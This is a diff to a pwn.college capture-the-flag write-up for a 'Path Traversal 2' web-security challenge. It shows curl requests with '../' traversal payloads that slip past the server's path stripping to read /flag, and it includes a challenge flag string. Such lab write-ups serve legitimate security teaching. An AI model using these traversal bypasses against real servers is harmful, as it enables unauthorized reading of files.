@@ -56,6 +56,7 @@ pwn.college{A0_4-6SgR7VQApzuImhC7CrZa4J.ddDOzMDL4ITM0EzW}
 
 ## Path Traversal 2
 
+### Source code
 ```py title="/challenge/server" showlineNumbers
 #!/opt/pwn.college/python
 
@@ -85,20 +86,21 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
-This cahllenge strips the `\.` charaacters from the beginning and the end of the `<path:path>` string.
+This cahllenge strips the `/.` charaacters from the beginning and the end of the `<path:path>` string.
 
 ```
 ## Request:
 curl "challenge.localhost:80/dump/../../flag"
 
 ## Strip
-../../flag  -->  flag
+../../flag  ==>  flag
 
 ## Full path
 /challenge/files/flag
 ```
 
 Fortunately, there is a `fortunes` directory we can use to our advantage.
+If we use `fortunes/../../../flag` as our `<path:path>`, the `/.` characters will not be stripped since thay are no longer trailing or leading the string.
 
 ```
 hacker@web-security~path-traversal-2:/$ ls /challenge/files/
@@ -110,10 +112,10 @@ fortunes  index.html
 curl "challenge.localhost:80/dump/fortunes/../../../flag"
 
 ## Strip
-fortunes/../../../flag  -->  fortunes/../../../flag  ## Since there are no leading or trailing `./` characters.
+fortunes/../../../flag  ==>  fortunes/../../../flag 
 
 ## Full path
-/challenge + /files/ + fortunes/../../../flag  -->  /challenge/files/fortunes/../../../flag  -->  /flag
+/challenge + /files/ + fortunes/../../../flag  ==>  /challenge/files/fortunes/../../../flag  ==>  /flag
 ```
 
 ```
